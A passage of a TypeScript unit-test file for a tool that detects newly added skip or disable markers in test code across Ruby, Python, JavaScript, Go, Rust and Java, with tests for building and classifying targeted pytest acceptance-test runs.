          'pending "not implemented"',
          'pending { some_code }',
          'pending do',
          'status = :pending',
          'message = "pending"',
          'let(:pending_case) { helper }',
          'pending_items = []',
        ],
      },
    });
    expect(markers).toHaveLength(4);
    expect(markers.map(m => m.line)).toEqual([
      'pending',
      'pending "not implemented"',
      'pending { some_code }',
      'pending do',
    ]);
  });

  it('does not false-positive on benign Ruby code containing the word pending', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['spec/test_spec.rb'],
      addedLinesByFile: {
        'spec/test_spec.rb': [
          'expect(status).to eq("pending")',
          'expect(status).to eq(:pending)',
          "{ pending: false }",
          "{ pending: true }",
          "let(:pending_task) { Task.new }",
          'result = thing.pending?',
        ],
      },
    });
    expect(markers).toHaveLength(0);
  });

  it('detects pending as skip in RSpec examples but avoids hash literals and symbols', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['spec/helpers_spec.rb'],
      addedLinesByFile: {
        'spec/helpers_spec.rb': [
          'it "does something" do',
          '  pending',
          'end',
          'it "another" do',
          '  pending("reason for skip")',
          'end',
        ],
      },
    });
    expect(markers).toHaveLength(2);
    expect(markers.map(m => m.marker)).toEqual(['pending', 'pending']);
  });

  // ─── Language-scoped marker tests: RSpec 'pending' only in Ruby files ────────

  it('RSpec pending marker is scoped to Ruby files — Python test_pending.py adding "pending = []" yields zero markers', () => {
    // The RSpec 'pending' marker matches the word "pending" with word boundaries,
    // but it should ONLY fire for Ruby/RSpec files, not Python files with
    // legitimate variable names like "pending = []".
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['test_pending.py'],
      addedLinesByFile: {
        'test_pending.py': [
          'pending = []',
          'pending.append(task)',
          'return pending',
        ],
      },
    });
    expect(markers).toHaveLength(0);
  });

  it('RSpec pending marker is scoped to Ruby files — JS test.js adding "pending = []" yields zero markers', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['pending.test.js'],
      addedLinesByFile: {
        'pending.test.js': [
          'let pending = [];',
          'const pending = [1, 2];',
          'pending.push(item);',
        ],
      },
    });
    expect(markers).toHaveLength(0);
  });

  it('RSpec pending marker is scoped to Ruby files — Go test adds "pending" identifier without affecting marker detection', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['util_test.go'],
      addedLinesByFile: {
        'util_test.go': [
          'pending := []Task{}',
          'pending = append(pending, task)',
          'self.pending()',
        ],
      },
    });
    expect(markers).toHaveLength(0);
  });

  // ─── Language-scoped marker tests: Go t.Skip() only in Go files ──────────────

  it('Go t.Skip() marker is scoped to Go files — JS test.js adding .Skip() call yields zero markers', () => {
    // The Go marker matches `<identifier>.Skip(`, but it should ONLY fire for Go
    // files, not JS/TS files that may have legitimate .Skip() method calls.
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['skip.test.js'],
      addedLinesByFile: {
        'skip.test.js': [
          'queue.Skip()',
          'runner.Skip(message)',
          'this.Skip()',
        ],
      },
    });
    expect(markers).toHaveLength(0);
  });

  it('Go t.Skip() marker is scoped to Go files — Python test file adding .Skip() call yields zero markers', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['test_runner.py'],
      addedLinesByFile: {
        'test_runner.py': [
          'obj.Skip()',
          'self.Skip("reason")',
          'queue.Skip()',
        ],
      },
    });
    expect(markers).toHaveLength(0);
  });

  // ─── Language-scoped marker tests: @Disabled/@Ignore only in JVM files ──────

  it('JUnit @Disabled marker is scoped to JVM files — JS/TS test file should not detect @Disabled', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['utils.test.ts'],
      addedLinesByFile: {
        'utils.test.ts': [
          '@Disabled',
          '@Ignore',
        ],
      },
    });
    expect(markers).toHaveLength(0);
  });

  // ─── Language-scoped marker tests: Rust #[ignore] only in Rust files ────────

  it('Rust #[ignore] marker is scoped to Rust files — JS test file should not detect #[ignore]', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['utils.test.js'],
      addedLinesByFile: {
        'utils.test.js': [
          '#[ignore]',
          '#[ignore = "slow"]',
        ],
      },
    });
    expect(markers).toHaveLength(0);
  });

  // ─── Language-scoped marker tests: Python @pytest only in Python files ───────

  it('Python @pytest.mark.skip marker is scoped to Python files — JS test file should not detect @pytest decorators', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['async.test.js'],
      addedLinesByFile: {
        'async.test.js': [
          '@pytest.mark.skip',
          '@pytest.mark.skipif(condition)',
          '@unittest.skip("reason")',
        ],
      },
    });
    expect(markers).toHaveLength(0);
  });

  // ─── Language-scoped marker tests: JS/TS markers only in JS/TS files ─────────

  it('JS/TS it.skip marker is scoped to JS/TS files — Python test file should not detect it.skip', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['test_module.py'],
      addedLinesByFile: {
        'test_module.py': [
          'it.skip',
          'describe.skip',
          'test.skip',
        ],
      },
    });
    expect(markers).toHaveLength(0);
  });

  // ─── Cross-language scenario: multilanguage detection ─────────────────────────

  it('correctly detects markers in mixed-language changes — Python and JS', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['test_app.py', 'app.test.js'],
      addedLinesByFile: {
        'test_app.py': [
          '@pytest.mark.skip("broken")',
          'pending = []',  // not a Python marker
        ],
        'app.test.js': [
          'it.skip("flaky", () => {})',
          '@pytest.mark.skip',  // not a JS/TS marker
        ],
      },
    });
    expect(markers).toHaveLength(2);
    expect(markers[0]).toEqual({
      file: 'test_app.py',
      marker: '@pytest.mark.skip',
      line: '@pytest.mark.skip("broken")',
    });
    expect(markers[1]).toEqual({
      file: 'app.test.js',
      marker: 'it.skip',
      line: 'it.skip("flaky", () => {})',
    });
  });

  it('correctly detects markers in Go, Rust, and JVM files with language scoping', () => {
    const markers = discoverNewlyDisabledTests({
      changedFiles: ['handler_test.go', 'lib_test.rs', 'AppTest.java'],
      addedLinesByFile: {
        'handler_test.go': ['t.Skip("not yet")'],
        'lib_test.rs': ['#[ignore]'],
        'AppTest.java': ['@Disabled', '@Ignore'],
      },
    });
    expect(markers).toHaveLength(4);
    expect(markers.map(m => m.marker).sort()).toEqual(
      ['#[ignore]', '@Disabled', '@Ignore', 't.Skip()'].sort(),
    );
  });
});

describe('buildAcceptanceTestRunner — targeted declared acceptance test', () => {
  const PYTEST_RUNNER: TestRunner = {
    cmd: 'python3', args: ['-m', 'pytest', '-x', '-q'],
    cwd: '/tmp/workspace/backend', label: 'pytest (backend)',
  };

  it('targets a pytest node-id selector against a detected pytest runner', () => {
    const runner = buildAcceptanceTestRunner(
      { descriptor: 'the seam test', selector: 'testing/test_seam.py::test_blocks' },
      [PYTEST_RUNNER],
    );
    expect(runner).not.toBeNull();
    // The selector is appended to the pytest argv (cwd ends in /backend, so the
    // testing/ prefix is normalized for a backend-run pytest).
    expect(runner?.args).toContain('testing/test_seam.py::test_blocks');
    expect(runner?.cmd).toBe('python3');
  });

  it('falls back to descriptor when no selector is given but descriptor is a pytest path', () => {
    const runner = buildAcceptanceTestRunner(
      { descriptor: 'testing/test_seam.py::test_x' },
      [PYTEST_RUNNER],
    );
    expect(runner).not.toBeNull();
    expect(runner?.args).toContain('testing/test_seam.py::test_x');
  });

  it('returns null for a non-pytest / prose descriptor (not targetable)', () => {
    expect(
      buildAcceptanceTestRunner({ descriptor: 'the dashboard renders the new column' }, [PYTEST_RUNNER]),
    ).toBeNull();
  });

  it('returns null when no detected runner accepts pytest selectors', () => {
    const goRunner: TestRunner = { cmd: 'go', args: ['test', './...'], cwd: '/tmp/workspace', label: 'go test' };
    expect(
      buildAcceptanceTestRunner({ descriptor: 'x', selector: 'testing/test_seam.py::test_x' }, [goRunner]),
    ).toBeNull();
  });

  it('returns null for an empty selector/descriptor', () => {
    expect(buildAcceptanceTestRunner({ descriptor: '   ' }, [PYTEST_RUNNER])).toBeNull();
  });
});

describe('classifyAcceptanceTestRun — ran / skipped / absent', () => {
  it('maps a real execution to ran', () => {
    expect(classifyAcceptanceTestRun('collected 1 item\n1 passed in 0.10s')).toBe('ran');
    // A failing-but-executed test still counts as ran (the suite gate owns pass/fail).
    expect(classifyAcceptanceTestRun('FAILED testing/test_seam.py::test_x\n1 failed in 0.2s')).toBe('ran');
  });

  it('maps an all-skipped run to skipped', () => {
    expect(classifyAcceptanceTestRun('collected 1 item\n1 skipped in 0.01s')).toBe('skipped');
  });

  it('maps a zero-collection / not-found run to absent', () => {
    expect(classifyAcceptanceTestRun('no tests ran in 0.01s')).toBe('absent');
    expect(classifyAcceptanceTestRun('collected 0 items')).toBe('absent');
  });
});
